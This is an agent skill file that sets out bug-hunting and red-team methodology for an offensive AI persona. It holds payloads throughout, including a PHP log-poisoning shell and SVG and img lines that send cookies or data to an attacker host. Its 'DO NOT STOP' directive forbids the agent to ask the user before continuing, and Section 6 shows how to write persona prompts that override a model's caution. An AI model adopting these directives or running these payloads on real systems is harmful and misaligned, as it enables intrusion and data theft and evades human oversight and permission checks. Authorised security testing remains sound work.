---
name: bughunter-methodology
description: "Comprehensive bug-hunting and red-team methodology synthesised from Claude-BugHunter (51 skills, 681 disclosed reports, 2 real engagements). Covers 6-phase workflow, 7-Question Gate, A-B-C chain tables, 47 hunt-* skill patterns, enterprise platform attacks, DO NOT STOP directive, mid-engagement IR detection, and engagement-mode awareness. Works in harmony with wordpress-pentesting, web-attacks, mission-orchestrator, and exploit-development skills."
sources: elementalsouls_claude_bughunter
---

# BugHunter Methodology

Full-spectrum bug hunting and red-team methodology. Complements our existing `wordpress-pentesting` (WP-specific), `web-attacks` (payloads), `mission-orchestrator` (workflow), and `exploit-development` (chains) skills by adding the methodology layer: validation gates, chain composition, discipline rules, and engagement-mode awareness.

## SECTION 0: INTEGRATION MAP

How this skill relates to existing skills:
- **wordpress-pentesting**: This skill's Legacy-Protocol Matrix extends WP XMLRPC patterns. File-upload bypass table extends dnd-upload-cf7 techniques. Always load both when engaging WP targets.
- **web-attacks**: This skill provides the "what to test when" framework. web-attacks provides the payloads. Load web-attacks for actual payload execution.
- **mission-orchestrator**: This skill's 6-phase workflow replaces ad-hoc scanning. The chain tables inform mission decomposition. 7-Question Gate validates findings before reporting.
- **exploit-development**: This skill's RCE chain patterns (SSRF→IMDS, SQLi→COPY FROM PROGRAM, ViewState→ysoserial) provide high-value targets. exploit-development handles the actual weaponization.
- **adaptive-engagement**: Priority-scoring algorithm, vector selection decision tree, engagement state machine, target fingerprinting. Load for autonomous target-adaptive operation. Killer Queen determines priority per engagement — no fixed list.
- **self-improvement**: After-action review templates, automated skill creation triggers, lesson extraction, memory curation, capability gap detection. Load after every engagement to compound knowledge.
- **social-engineering**: Phishing, vishing, physical entry, pretext development, USB drops. Load when credential attacks fail or operator authorizes social vectors.
- **browser-exploitation**: BeEF, XSS framework, postMessage, DOM clobbering, service workers, browser extensions. Load for client-side attack campaigns.
- **wireless-rf**: WiFi WPA2/WPA3, Bluetooth/BLE, RFID/NFC, SDR/HackRF, Zigbee. Load for physical proximity or wireless assessments.
- **embedded-iot-attacks**: Firmware extraction, ICS/SCADA protocols, UEFI bootkits, IoT hardware hacking, RTOS security. Load for IoT/embedded/ICS targets.
- **cloud-iam-attacks**: 30 IAM escalation paths, Lambda/OIDC/RolesAnywhere persistence, GuardDuty evasion, organization attacks. Load for AWS/cloud privilege escalation.
- **firmware-iot**: Firmware extraction, UART/JTAG/SPI, QEMU emulation, MQTT/CoAP/Zigbee. Load for IoT/embedded targets.
- **supply-chain-attacks**: Dependency confusion, container poisoning, CI/CD injection, Git attacks, build system backdoors. Load for code-review or infrastructure assessments.
- **blockchain-web3**: Smart contract reentrancy, flash loans, oracle manipulation, MEV, bridge attacks. Load for Web3/DeFi engagements.

---

## SECTION 1: 6-PHASE WORKFLOW

```
1. SCOPE → 2. RECON → 3. HUNT → 4. VALIDATE → 5. CAPTURE → 6. REPORT
```

### Phase 1: SCOPE — Confirm engagement type BEFORE testing

**The single most important decision.** Getting this wrong wastes everything.

| Engagement Type | What Counts as Finding | What Gets Rejected |
|----------------|----------------------|-------------------|
| **Bug bounty** (H1/Bugcrowd/Intigriti) | Impact-demonstrated bugs ONLY. Full chain to attacker-attainable harm. | Hygiene (EoL software, CSP, stack traces, info disclosure without impact, "best practice" violations) |
| **Red team** (external client) | Hygiene + recon + IoCs + defensive-state observations = ALL deliverables | Nothing — "no finding here" is a positive defensive observation |
| **Pentest** (signed SoW/WAPT) | Depends on SoW. Usually accepts hygiene + impact + recon | Out-of-scope assets only |

**Real-engagement lesson (Engagement 01):** First pass produced 5 hygiene findings (SP2013 EoL, permissive CSP, stack traces) framed as red-team report. Engagement was bug bounty — all 5 would have been N/A'd. Corrected pass: 11 impact-demonstrated bugs including 3 Critical.

### ADAPTIVE ATTACK PRIORITIZATION (Operator Correction — June 2026)

**Killer Queen determines the priority order per engagement. No fixed list.**

The operator does not prescribe what matters on a target — Killer Queen tells the operator what matters. Every engagement starts with a fresh read of the attack surface. The priority order emerges from target analysis, not from memory of a previous target.

**How to build the priority order (per engagement):**

1. Read the attack surface — map everything before ranking anything
2. Identify the path of least resistance — what's the weakest door?
3. Order vectors by exploitability × impact — what's easiest AND most damaging?
4. Report the priority order to the operator before executing

**Pitfall**: Carrying a priority list from a previous engagement into a new one. The azzrk.com engagement was a hardened WordPress site on Contabo — brute force and credential attacks were the only viable paths. A different target might have SQLi, SSRF, or cloud misconfig as the primary vector. Killer Queen adapts. Always.

**Pitfall**: Operator says "priority is X, Y, Z" before recon. That's fine — the operator can steer. But Killer Queen's default is to determine priorities from the target, not from operator habit. If the operator specifies a priority order, execute it. If they don't, build one from the target.

### Phase 2: RECON — Asset Discovery Pipeline

```
Subfinder + Assetfinder + Chaos API  →  subdomains.txt
dnsx + httpx (status/title/tech)     →  live-hosts.txt
Katana deep + Waybackurls + Gau      →  urls.txt
GF patterns                          →  {class}-candidates.txt
Nuclei                               →  known CVE hits
JS bundle secret grep                →  API keys, tokens, endpoints
```

Key recon principles:
- Every robots.txt Disallow line is a developer-curated path map — probe every single one
- Every sitemap.xml entry is a probe target
- Source maps (`/*.js.map`, `/static/js/*.js.map`, `/_next/static/*.js.map`) = reconstructed source code
- JS bundles harvest: full secret-regex catalogue (Firebase, AWS, GCP, JWT, Stripe, GitHub, generic high-entropy)
- Identity fabric mapping: GetUserRealm, OpenID well-known, autodiscover-v2, federation metadata

### Phase 3: HUNT — Active Testing (47 Vulnerability Classes)

Hunting follows a structured pattern per class:
1. Identify Crown Jewel targets (highest-value surfaces for that class)
2. Map attack surface signals (URL patterns, JS patterns, response headers, tech stack)
3. Run step-by-step methodology with payloads
4. Validate with class-specific Gate 0 questions
5. Chain findings via A→B table

**Full Vulnerability Class Catalogue (47 classes):**

#### Injection (4 classes)
- **SQLi**: 12+ injection classes. Modern ORM bypass (Django JSONField CVE-2024-42005, Sequelize raw-fragment, Mongoose $where CVE-2024-53900). Header-based injection to bypass URL WAFs. Airflow authenticated-injection pattern. Second-order SOQL on Salesforce. Crown Jewels: SaaS multi-tenant DBs, e-commerce/payment, search/filter/sort endpoints. Bypasses: MySQL `/*!50000SELECT*/` version comments, `BENCHMARK()` when SLEEP blocked, chunked transfer encoding, JSON `$\u0067t` Unicode escape for NoSQL WAF.
- **NoSQLi**: MongoDB `$regex`/`$gt`/`$ne` auth bypass. `$where` JS injection with sleep-based detection. Operator injection via JSON bodies.
- **SSTI**: Engine fingerprint: `{{7*7}}=49` (Jinja2/Twig), `${7*7}=49` (Freemarker), `*{7*7}=49` (Thymeleaf). RCE via class-walker or Execute-utility patterns. One payload per engine.
- **Command Injection**: Detection (`;id`, `$(id)`, backtick), blind OOB, space bypass (`${IFS}`, `{cat,/etc/passwd}`), keyword filter bypass (`c'a't`, hex encoding), filename injection.

#### Cross-Site (4 classes)
- **XSS**: 174 reports. OOB-Or-It-Didn't-Happen Gate for blind/stored XSS (requires Collaborator callback from real browser). Marker discipline: 8+ char random canary, pre-search baseline. 6 XSS chains: reflected+cache poisoning→stored at CDN scale, self-XSS+CSRF→effective stored→ATO, DOM on /signin→fragment token capture→ATO, SVG upload+CSP bypass, postMessage+origin bypass, Markdown/wiki+privileged viewer. Crown Jewels: admin panels, SSO/signin pages, SVG/file upload endpoints.
- **DOM XSS**: postMessage handlers, dangerouslySetInnerHTML, Vue v-html, Angular template injection. Source-to-sink mapping.
- **CSRF**: SameSite=Lax sibling-subdomain bypass (Argo CD CVE-2024-22424). GraphQL mutations-via-GET. Duende BFF role-partitioned antiforgery.
- **XS-Leak**: NEW — 11 event handler techniques (onload/onerror timing, CORB detection, postMessage/XFO oracle, sandboxed frame, #ID hash change, JS execution, onblur, BroadcastChannel). 5 global limits (WebSocket pool, Payment API, Event Loop, Connection Pool, Performance API). 17 Performance API techniques (error leak, X-Frame, download, CORP, cache, network duration). 15+ readable attribute techniques (frame counting, history.length, CSS property, COOP, URL max length, max redirects, partitioned cache, Service Workers). Tools: XSinator, xsleaks.com, PortSwigger XS-Leak labs.

#### Authorization (5 classes)
- **IDOR**: 26 reports. 6 IDOR chains: email-change+no-reauth→password reset→ATO, file-download+filename CD→reflected XSS, GraphQL node(id) GID+Relay traversal→cross-tenant mass data, team-membership+mass-assignment→role escalation, soft-delete+post-removal token→persistent access, double-IDOR (`/users/{id}/orders`→`/orders/{id}/refund`)→financial. UUID bypass: harvest from notification emails, webhooks, GraphQL queries, JS source.
- **Auth Bypass**: 12+ bypass classes. **Legacy-Protocol Matrix** (17 platform-specific endpoints that accept native creds independently of branded UI SSO/MFA): WordPress `/xmlrpc.php`, SharePoint `/_vti_bin/Authentication.asmx`, Jira/Confluence `/rest/auth/1/session`, Exchange/OWA `/EWS/Exchange.asmx`, and 13 more. SAML parser-differential XSW (CVE-2025-25291). Duende BFF 3-class attack surface. Partner-portal assertion reuse (Slack $3K).
- **OAuth**: 10 reports. Browser-parse vs server-parse redirect_uri matrix (WHATWG URL parser). "Dirty Dancing" multi-vendor token leakage. `response_type` swapping. OAuth substring trap: Microsoft AADSTS50076 response contains literal `access_token` inside claims-challenge JSON — JSON-parse, NEVER substring-match.
- **SAML**: XSW1-XSW8 variants (newly catalogued), comment injection, signature stripping, XXE in assertion, Signature Exclusion, Certificate Faking, Token Recipient/SP Target Confusion, XSS in Logout (Uber case), RelayState injection→rXSS with CSRF delivery, XML round-trip discrepancy (REXML attr.to_s vs attr.value). CVE-2024-45409 Ruby-SAML XPath injection bypass. SAML Raider Burp extension.
- **PostMessage**: NEW — 6 send methods (page, iframe, popup, URL, nested iframe, BroadcastChannel). 6 origin check bypasses (indexOf substring, search regex, match, escapeHtml via Error/File, document.domain, null origin). Key attacks: wildcard target *, e.source bypass via deleted iframe, X-Frame-Header bypass, message stealing, Prototype Pollution+XSS combo, CAPIG origin-derived script loading, Math.random() PRNG prediction→V8 Z3 solver→callback token forgery.
- **MFA Bypass**: 7 patterns: OTP replay, response manipulation, skip-MFA-step, single-packet OTP race, factor enumeration, push-notification fatigue, backup-code brute.

#### Server-Side (5 classes)
- **SSRF**: 15 reports (highest payouts — $25K+). **OOB-Or-It-Didn't-Happen Gate**: blind SSRF requires Collaborator/interactsh confirmation. Server echoing your URL in error message is NOT confirmation. Real lesson: SharePoint `download.aspx?SourceUrl=` returned 500 with attacker URL echoed — 38 Collaborator probes = ZERO callbacks. Sub-tag sinks per vector. Cloud metadata URLs: AWS IMDSv1 `169.254.169.254`, GCP `metadata.google.internal`, Azure `169.254.169.254`. `gopher://` to Redis→crontab→RCE. Headless browser SSRF via HTML→iframe→file://.
- **XXE**: Parser-ecosystem vulnerability matrix (2026). Python lxml ≥5.x hardened by default. Inline-entity probe (`&hello;`) before SYSTEM escalation. DOCX/SVG/PDF upload vectors.
- **HTTP Smuggling**: Target-Suitability Matrix — Nginx ≥1.21: RFC-strict (NO), HAProxy ≤2.4: YES, AWS ALB+specific upstream: partial. H2.CL/H2.TE as dominant modern vector for CDN+origin chains. Operator fingerprint: `curl -sI` → `Server:` + `Via:` chain. NEW VARIANTS: CL.0/TE.0/0.CL, Connection-locked smuggling, TRACE desync+response splitting, Hop-by-hop header forcing (Connection: Content-Length), Pingora 2026 footguns (Premature Upgrade passthrough, TE comma-splitting, duplicate TE headers, path-only cache key poisoning). Turbo Intruder scripts for CL.TE/TE.CL detection.
- **Cache Poison**: Akamai hop-by-hop smuggling→server-side edge poisoning ($50K+). Cloudflare Cache Deception Armor bypass via `.avif` extension. Web Cache Deception: CDN path traversal (%2F..%2F), Fat GET, Parameter Cloaking, extension tricks (.css/.js suffix), Header-reflection XSS+CDN seeding→all visitors poisoned, CSPT-assisted authenticated cache poisoning→ATO. Sitecore pre-auth. Tools: toxicache, CacheDecepHound.
- **LFI**: 7-phase methodology: candidates→basic traversal→PHP wrappers→log poisoning→session poisoning→phar:// deserialization→automation. PHP wrapper chain: `php://filter/convert.base64-encode/resource=`. Log poisoning: inject `<?php system($_GET[cmd]);?>` via User-Agent→include access.log→RCE.

#### File & Upload (1 class)
- **File Upload**: 10 Bypass Techniques: extension bypass (`shell.php.jpg`), null byte, double extension, MIME spoof, magic bytes prefix (`GIF89a;<?php`), polyglot files, SVG JavaScript, XXE in DOCX, ZIP slip, filename injection. **Directly applicable to dnd-upload-cf7 work.** ImageMagick SSRF (ImageTragick): MVG `fill 'url(http://169.254.169.254/)'`. FFmpeg SSRF via HLS playlist. Headless Chrome PDF generator SSRF.

#### API & Modern (4 classes)
- **GraphQL**: Alias-batching vs resolver model. `clairvoyance` for blind schema enumeration. IDOR via `node(id:)` GID+Relay traversal. Introspection→auth bypass on mutations.
- **API Misconfig**: OData `$filter` WAF-bypass (Dynamics 365 password hash extraction). NSwag/Swagger/OpenAPI spec→mass IDOR+mass-assignment. Duende BFF role-partitioned antiforgery.
- **WebSocket**: IDOR auth bypass, CSWSH, Origin validation, XSS/SQLi/SSRF via WS messages.
- **gRPC**: Unauthenticated reflection, method enumeration, JSON transcoding auth bypass.

#### Business & Race (3 classes)
- **Business Logic**: 12 reports. Financial-impact patterns: negative-quantity price tampering (`qty=-3,price=50`→-$100 floors to $0), price-per-unit mass-assignment (`PUT /v2/seats price=1`), archived-price swap/cart-TOCTOU, fee discount race-redemption.
- **Race Condition**: 12 reports. **HTTP/2 single-packet attack** (Kettle DEF CON 31): pre-buffer N requests, withhold final DATA byte, release in one TCP write. Race window: millisecond→microsecond. Flatt first-sequence-sync (2024): extends to 10K requests via IP fragmentation. Anti-pattern: Burp "Send group in parallel" uses HTTP/1.1 pipelining with millisecond spread — NOT a true race.
- **LLM/AI**: OWASP ASI 2026: ASI01-ASI10. Must chain prompt injection→IDOR/exfil/RCE/ATO for bounty. ASCII smuggling via Unicode tag block U+E0000-U+E007F.

#### Identity & Session (5 classes)
- **ATO**: 9-path taxonomy: password reset poisoning, token referrer leak, predictable tokens, no expiry, email change without re-auth, MFA bypass, session-fixation, JWT manipulation, social recovery abuse.
- **Session**: Session fixation, no invalidation on password change, concurrent session abuse, session puzzling.
- **JWT**: alg=none, alg=HS256-with-RS256-key, audience confusion, scope claim manipulation, refresh-token replay.
- **Brute Force**: OTP brute (1M codes), IP rotation bypass via X-Forwarded-For, ReDoS exponential CPU spike. Smart Lockout math for M365: 10 fails in 10 min→lockout. Cap: ≤2 attempts per user lifetime.
- **Host Header**: Password reset poisoning→ATO, X-Forwarded-Host cache poisoning.

#### Information Disclosure (3 classes)
- **CORS**: Subdomain takeover+CORS regex bypass→credentialed cross-origin API read. Origin reflection+Allow-Credentials:true.
- **Source Leak**: `.js.map`→reconstructed TypeScript→secrets. Swagger/OpenAPI JSON→complete API surface. `.git/`→full history.
- **TLS/Network**: Missing DMARC+weak SPF=send email as CEO. DNS AXFR=full internal hostname map.

#### Platform-Specific (8 classes)
- **SharePoint**: ToolShell precondition chain (CVE-2025-53770). EoL farm permanent-CVE-window after 2023-04-11. `/_vti_bin/Authentication.asmx` as legacy auth endpoint.
- **ASP.NET**: ViewState dual-parser MAC-bypass. `__VIEWSTATEENCRYPTED=""` (signed-only=exploitable). Telerik `WebResource.axd` RCE sink.
- **NTLM Info**: NTLM Type-2 challenge AD-topology disclosure.
- **Next.js**: `__NEXT_DATA__` props inspection, buildId leak, `/api/*` route enumeration.
- **Node.js**: prototype pollution gadgets, `node-serialize` RCE, `vm.runInNewContext` sandbox escape.
- **Laravel**: Ignition debug RCE (CVE-2021-3129), Telescope dashboard exposure, `.env` backup download.
- **Spring Boot**: `/actuator` endpoints, `/env`→Eureka RCE (CVE-2022-22965), Whitelabel error page info leak.
- **Subdomain**: OAuth redirect_uri→ATO, cookie-domain→session fixation, CSP script-src→XSS, CORS→API read, DKIM/SPF→email spoofing.

#### Infrastructure (5 classes)
- **Cloud Misconfig**: CloudWatch RUM weaponization: Cognito identity pool→STS creds→IAM role abuse. Telemetry endpoint as covert exfil channel. Public S3→JS bundle→secret→OAuth chain.
- **K8s**: Kubelet 10250 unauth exec, etcd 2379 unauth full secret dump, docker.sock→privileged container→host escape.
- **CI/CD**: GitHub Actions `pull_request_target` injection→org secret exfil. Terraform state file→all infra credentials.
- **Deserialization**: Java `AC ED 00 05`, PHP `O:8:"stdClass"`, Python pickle `\x80\x04`. ysoserial, phpggc, YSoSerial.Net.
- **Open Redirect**: Standalone=Low. 12 bypass techniques. Chained OAuth=Critical.

### Phase 4: VALIDATE — 7-Question Gate

**Ask IN ORDER. First NO = KILL the finding.**

| Q# | Question | Fail Result |
|----|----------|-------------|
| Q1 | Can you demonstrate with a real HTTP request RIGHT NOW? | KILL |
| Q2 | Is this impact type accepted by the program? | KILL |
| Q3 | Is the vulnerable asset in-scope (not third-party)? | KILL |
| Q4 | Does this work WITHOUT admin/privileged access? | KILL (99% of programs) |
| Q5 | Is this NOT already known/disclosed/documented? | KILL |
| Q6 | Can you prove impact BEYOND "technically possible"? | DOWNGRADE |
| Q7 | Is this NOT on the never-submit list? | KILL or CHAIN |

**Never-Submit List (Q7 immediate kills unless chained):**
- "Admin can do X" = not a bug
- Missing security headers alone (CSP, HSTS, DMARC, X-Frame-Options)
- Self-XSS (only affects own account)
- Open redirect alone (no OAuth chain)
- SSRF with DNS-only callback (no data returned from internal service)
- Rate limit on login/contact/search endpoints
- Logout CSRF
- Mixed content warnings
- Clickjacking on non-sensitive pages
- "Could theoretically lead to..." (no working PoC)
- Missing rate limit on non-sensitive endpoints
- Information disclosure without demonstrated impact
- Bug requires 3+ preconditions simultaneously

**Conditional-Kill (must chain for submission):**
- Open redirect → OAuth code theft → ATO = report the chain
- SSRF DNS → internal service with data → report the chain
- CORS → credentialed data exfil PoC → report the chain
- Self-XSS → CSRF trigger → effective stored XSS → report the chain
- Subdomain takeover → OAuth redirect_uri claim → ATO → report the chain
- Missing CSP → existing XSS amplification → report the chain
- Prompt injection → IDOR via chatbot → report the chain

### Phase 5: CAPTURE — Evidence Hygiene
- Cookie/PII redaction BEFORE screenshots
- Multi-tool reproduction (curl + Python raw socket + Burp Repeater)
- Timestamped pre-patch PoC when findings stop reproducing (assume client patched — DON'T retract)

### Phase 6: REPORT — Platform-Specific Templates
- HackerOne: Impact-only, no hygiene fillers, CVSS 3.1
- Bugcrowd: VRT category mapping required, severity request paragraphs
- Red team: DOCX (Subject/Observations/Description/Impact/Recommendation/PoC)

---

## SECTION 2: A→B CHAIN TABLE (20+ Pre-Mapped Escalation Paths)

When you find A, immediately check B and C:

| Found A | Immediately Check B | Also Check C |
|---------|---------------------|--------------|
| IDOR on GET /api/user/X/orders | IDOR on PUT/DELETE same path | IDOR on ALL sibling endpoints |
| IDOR on /v2/ endpoint | Same IDOR on /v1/ (missing fix) | Mobile API version |
| Auth bypass on one endpoint | Every sibling in same controller | Old API version |
| Stored XSS in user input | Does admin view this? (priv esc) | Email/export/PDF rendering |
| SSRF with DNS callback | SSRF reaching internal services | SSRF via open redirect |
| SQLi on one parameter | Every parameter in same endpoint | Same param type in siblings |
| File upload — PNG allowed | SVG (XSS), HTML, PHP/JSP (RCE) | Double extension: shell.php.jpg |
| OAuth missing PKCE | CSRF on OAuth flow (state param?) | Token reuse: auth_code exchanged twice? |
| Open redirect confirmed | OAuth code theft via redirect_uri | Phishing chain |
| GraphQL introspection | Auth bypass on mutations | IDOR via node(id) |
| Race condition on coupons | Race on credits/wallet | Race on rate limits |
| Exposed S3 listing | JS bundles→grep API keys/OAuth | .env files in bucket |
| Leaked API key in JS | Call API as that key — what can it do? | Other keys in same JS file |
| LLM prompt injection | IDOR via chatbot (read other users) | Exfil: `<img src="attacker?d=DATA">` |
| CSRF on sensitive action | XSS→CSRF = Critical | img src/form autosubmit |
| Path traversal | LFI: /proc/self/environ or logs | Log poisoning→RCE |
| Missing rate limit on OTP | Brute force OTP directly | Brute force password reset tokens |
| Subdomain takeover (dangling CNAME) | OAuth redirect_uri on that subdomain | Cookie-domain session fixation |

**Top 5 Highest-Value Chains:**
1. S3→Bundle→Secret→OAuth (Coinbase Pattern) — 3 reports, Low+Med+Med
2. Open Redirect→OAuth Code Theft→ATO — Critical, no user interaction beyond click
3. XSS→CSRF→Admin Action — Critical, account escalation
4. SSRF DNS→Internal Service→Cloud Metadata — Critical, full cloud account access
5. Subdomain Takeover→OAuth redirect_uri→ATO — Critical

**6 Canonical RCE Chains:**
1. SSRF+IMDSv1+Lambda invoke (Capital One pattern)
2. SQLi+`COPY FROM PROGRAM`→Postgres OS-level RCE
3. Image upload+path traversal+MIME serving→webshell
4. Prototype pollution+Lodash/Mongoose gadget→`child_process.spawn`
5. Unencrypted ViewState+MachineKey→`ysoserial.net` deserialization
6. XXE+PHP `expect://` stream wrapper

---

## SECTION 3: CRITICAL DISCIPLINE RULES

### OOB-Or-It-Didn't-Happen (blind vuln claims)
- Blind SSRF/XXE/RCE requires out-of-band confirmation (Collaborator/interactsh/canarytoken)
- Server echoing your URL in error message is NOT confirmation — it's string formatting
- Sub-tag sinks per vector so callbacks identify the exact sink
- Real lesson: SharePoint returned 500 with attacker URL in title — 38 Collaborator probes = ZERO callbacks

### DO NOT STOP Directive (Red Team)
10 self-throttling anti-patterns caught in real engagements:
1. Asking "want me to continue?" after user chose full engagement — the answer they gave IS the answer
2. Stopping at first 401/403 — 12+ auth-bypass classes exist
3. Not chasing constant tokens/hashes across varying responses
4. NOT reading robots.txt Disallow lines (dev-curated path map — every line is a probe target)
5. Treating soft-404 (>1KB body) as "noted" without reading content
6. OpenAPI exposed but only 4 of N endpoints probed
7. "APK retest deferred" — jadx installs in 5 minutes
8. Framing volume as problem — 3K well-tagged requests is normal cadence
9. Inserting AskUserQuestion mid-engagement loop
10. Skill-gap-as-stop-condition — do it manually, log the gap, KEEP GOING

### Mid-Engagement IR Detection
- Confirmed finding stops reproducing = client PATCHED it (deliverable), NOT false positive (retractable)
- Pre/post fingerprint diffs detect WAF deployments vs code fixes
- External attacker activity during your test is itself a deliverable
- Real lesson (Engagement 02): SOC patched confirmed SQLi within 30 minutes — kept finding with timestamped pre-patch PoC

### Marker Discipline
- Synthetic, identifiable, recoverable payloads (unique markers per sink)
- Hardened targets need MORE marker probes, not fewer
- Statistical sampling: n≥80 for timing claims, n≥30 for body-diff claims
- Pre-search baseline for false-positive overlap

### Per-Host Sweep Checklist (Red Team cadence)
Before declaring a host complete:
- Top-100 path probe: admin, api, login, /.git, /.env, server-status, swagger, openapi.json, /docs, /actuator, /healthz, /metrics, /debug, /trace, /env, /heapdump, /threaddump, robots.txt, sitemap.xml, /.well-known/*
- robots.txt READ — every Disallow→probe
- sitemap.xml READ — every entry→probe
- JS bundles harvested — full secret-regex catalogue+route extraction
- Source-map paths: `/*.js.map`, `/static/js/*.js.map`, `/_next/static/*.js.map`, `/build/*.js.map`
- Every form: full SQLi marker sweep (12+ classes), auth-bypass sweep (12+ classes), CSRF, parameter pollution, mass-assignment, race condition
- Every API endpoint: HTTP method tampering, content-type tampering, JWT alg=none, alg=HS256-with-RS256-key, audience confusion, prototype pollution
- Identity fabric: GetUserRealm, OpenID well-known, autodiscover-v2, federation behavior, sister-brand-TLD pivot

---

## SECTION 4: ENTERPRISE PLATFORM ATTACKS

### M365 / Entra ID
- **AADSTS code differential**: 53003=CA blocked, 50076=MFA required, 50079=Strong auth — PASSWORD VALID despite no token
- **OneDrive personal-site enumeration**: 302=user EXISTS, 404=doesn't exist. ZERO auth attempt=ZERO lockout
- **License differential**: OneDrive 404+ROPC 50126="functional/service account" — historic MFA-exempt class, prime target
- **Smart Lockout math**: 10 fails/10 min→lockout. Cap: ≤2 attempts per user lifetime
- **ROPC client_id rotation**: Graph PS vs Azure CLI vs Office — CA policies per-app
- **OAuth substring trap**: AADSTS50076 body contains `access_token` in claims-challenge JSON — NOT an actual token

### Okta
- Factor enumeration from `/api/v1/authn` response — reveals MFA factor types (webauthn=resistant, SMS=phishable)
- Inbound federation: attacker-controlled IdP→arbitrary NameID→accepted as authentic
- CVE-2024-0981: bcrypt 72-byte truncation→password bypass

### Cloud IAM
- 24+ AWS privesc paths: `iam:CreateAccessKey`, `iam:PassRole`→Lambda/S3/EC2, `sts:AssumeRole`→cross-account
- Cognito Identity Pool unauthenticated: `GetId`→`GetCredentialsForIdentity`→STS creds→IAM role
- CloudWatch RUM as credential vending machine: Cognito pool→STS→telemetry as covert exfil
- 8+ Azure, 6+ GCP privesc paths

### Enterprise VPN (6-vendor CVE matrix)
- Cisco ASA, Fortinet, Citrix, Palo Alto, Pulse/Ivanti, SonicWall/F5
- CVE matrix 2018-2026 with exact probe commands per vendor
- SAML SP metadata as anonymous intel: AuthnRequestsSigned=false→XSW exploitation
- Cisco tunnel-group enumeration via timing differential

### Supply Chain
- Internal package-name discovery from JS bundles→404 on npm=dependency-confusion candidate
- GitHub Actions `pull_request_target`+`${{ github.event.* }}` in shell=RCE with org secrets
- Docker layer mining: `docker save`→extract layers→trufflehog over filesystem

---

## SECTION 5: WORDPRESS-SPECIFIC INTEGRATION

When hunting WordPress targets, cross-reference with `wordpress-pentesting` skill:

### Legacy Auth Endpoints
WordPress `/xmlrpc.php` is the canonical example of the Legacy-Protocol Matrix. It bypasses SSO/MFA by accepting native credentials via `wp.getUsersBlogs`. The pattern: every custom login UI hides a legacy protocol endpoint. SharePoint `/_vti_bin/Authentication.asmx` is the Microsoft equivalent.

### File Upload Chains (dnd-upload-cf7 context)
- Extension bypass table directly applicable to dnd-upload-cf7 restrictions
- Magic bytes prefix: `GIF89a;<?php` — embed PHP in image headers
- Double extension: `shell.php.jpg` — test MIME-type vs extension validation order
- SVG JavaScript: `<svg onload=fetch('attacker?c='+document.cookie)>` — bypasses image-only uploads
- PHAR deserialization: dead on PHP ≥8.4 (documented in our memory). PHP wrappers still viable.

### Plugin-Specific Patterns
- Every plugin endpoint→test auth bypass on same controller siblings
- XMLRPC→test all methods, not just `wp.getUsersBlogs`
- REST API→check all registered routes for missing `permission_callback`

---

## SECTION 6: AGENT PERSONA ENGINEERING (Prometheus v2 pattern)

Technique for crafting a SOUL.md that transforms any AI model into an offensive security operator. Learned from building Prometheus v2 (Hermes+OpenClaw fusion).

### Constitutional Directive Architecture
Structure the persona as IMMUTABLE directives that survive context compression:
1. Place directives at the TOP of SOUL.md — they load first, compress last
2. Use short, imperative, unambiguous language (no XML tags, no markdown tricks)
3. Each directive must be self-contained — no cross-references that break on truncation
4. Number them (I-X) — creates a memorizable sequence the model can reference
5. Use visual separators (═══════) to create hard boundaries between sections

### Model-Agnostic Design
The same SOUL.md should work with DeepSeek, Claude, GPT, and Gemini:
- Constitutional directives use plain English, no model-specific formatting
- Add per-model-family guidance blocks at the BOTTOM (auto-detected via model name)
  - DeepSeek: Lean into structured methodology, compensate for lateral thinking
  - Claude: Counter over-caution with explicit DO NOT STOP directive
  - GPT: Trust loaded skills over pre-training, lean into creative chains
  - Gemini: Explicit tool calls, don't batch assumptions
- Keep model guidance separate from core directives — it's optional flavor

### Layered Prompt Architecture
```
[CONSTITUTIONAL DIRECTIVES]   ← Loaded first, survive compression (IMMUTABLE)
[OPERATIONAL METHODOLOGY]     ← 6-phase workflow, validation gates
[TECHNIQUE CATALOG]           ← Chain tables, bypass patterns, payload classes
[MODEL-SPECIFIC GUIDANCE]     ← Injected based on detected model family
[ENGAGEMENT CONTEXT]          ← Target dossier, active vectors, running workers
[TOOL AWARENESS]              ← Available tools, Kali inventory
```

### What to Bake Into the Persona (not skills)
- Behavioral rules that apply to EVERY engagement (not per-class methodology)
- Chain-first thinking pattern (every finding = primitive)
- Validation gate (7 questions, never-submit list)
- Baked-in lessons from real engagements (PHAR dead, OAuth traps, DND nonce, cPanel rates)
- Tool awareness (available tools, when to use each)
- Model-specific compensations (what each model family is bad at)

### What Belongs in Skills (not persona)
- Per-class payloads and bypass tables (SQLi, XSS, SSRF, etc.)
- Platform-specific CVE chains (SharePoint, M365, Okta, vCenter)
- Tool-specific commands (hydra syntax, nuclei templates, ffuf patterns)
- Session-specific target intel and engagement state

### Verification Pattern
After writing SOUL.md, verify it transforms behavior:
1. Ask the same question with and without the persona loaded
2. Check: does it DO instead of DESCRIBE? Does it CHAIN instead of isolate? Does it VERIFY instead of trust?
3. If the model hedges or asks permission, strengthen the DO NOT STOP directive
4. If the model treats findings in isolation, strengthen CHAIN-FIRST THINKING

---

## SECTION 6: PAYLOAD CATEGORIES (security-arsenal cross-reference)

Full payloads in `web-attacks` skill. This section lists CATEGORIES for dispatch:

- **XSS**: CSP bypass (SVG, mXSS, polyglot), DOM sources+sinks, cookie theft templates
- **SSRF**: Cloud metadata URLs, IP bypass (decimal/octal/hex), DNS rebinding, redirect chains
- **SQLi**: Union-based, blind time-based (MySQL/PG/MSSQL/Oracle), WAF bypass, ORM bypass
- **XXE**: Classic file read, blind OOB HTTP, blind OOB DNS+exfil, DOCX/SVG/PDF upload
- **Path Traversal**: Double-dot bypass (`....//`), double URL encoding (`%252f`), null byte
- **NoSQLi**: Operator injection (`$ne`,`$regex`,`$gt`,`$where`), GET parameter injection
- **Command Injection**: Detection, blind OOB, space bypass (`${IFS}`), filter bypass, filename injection
- **SSTI**: Universal probe, per-engine RCE (Jinja2, Twig, Freemarker, ERB, Thymeleaf, EJS)
- **HTTP Smuggling**: CL.TE, TE.CL, TE.TE obfuscations, H2.CL
- **MFA Bypass**: OTP brute (ffuf), reuse, response manipulation, race on verification, skip-step
- **SAML**: XSW templates, comment injection, signature stripping

**## SECTION 8: SUPPORT REFERENCES

Load these reference files for session-specific detail:
- `references/webshell-inventory.md` — Complete Kali webshell collection (standard + Laudanum + Seclists + BlackArch 216 net-new)
- `references/netexec-capabilities.md` — NetExec v1.5.1 protocol support, credential attacks, lateral movement
- `references/agent-architecture-insights.md` — Hermes + OpenClaw source analysis, fusion architecture, SOUL.md mechanics
